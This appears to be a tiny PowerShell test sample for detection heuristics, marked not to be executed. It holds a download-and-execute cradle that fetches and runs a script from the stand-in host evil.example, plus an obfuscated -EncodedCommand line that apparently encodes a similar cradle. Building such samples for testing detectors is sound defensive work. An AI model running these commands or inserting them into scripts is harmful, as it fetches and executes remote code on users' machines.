# Suspicious PowerShell sample for heuristic testing (DO NOT EXECUTE)
$client = New-Object Net.WebClient
IEX($client.DownloadString("http://evil.example/payload.ps1"))
powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAQ==
